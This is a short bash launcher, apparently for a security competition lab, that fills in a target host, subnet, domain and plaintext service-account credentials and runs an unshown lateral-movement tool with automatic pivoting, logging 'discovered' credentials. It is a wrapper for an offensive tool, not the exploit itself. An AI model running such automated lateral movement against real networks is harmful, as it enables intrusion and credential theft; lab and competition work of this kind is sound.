#!/bin/bash

# Competition Quick Start Script
# Edit these variables with your initial credentials

TARGET="100.65.7.12"
USERNAME="svc_sql"
PASSWORD="studentBad!"
DOMAIN="lab.local"
SUBNET="100.65.7.0/24"

echo "[*] Starting automated lateral movement..."
python3 lateral_movement_tool.py \
    -t "$TARGET" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -d "$DOMAIN" \
    --subnet "$SUBNET" \
    --auto-pivot \
    --max-depth 3 \
    -v \
    -o competition_report.json \
    2>&1 | tee competition.log

echo "[+] Attack complete. Check competition_report.json and discovered_creds.json"
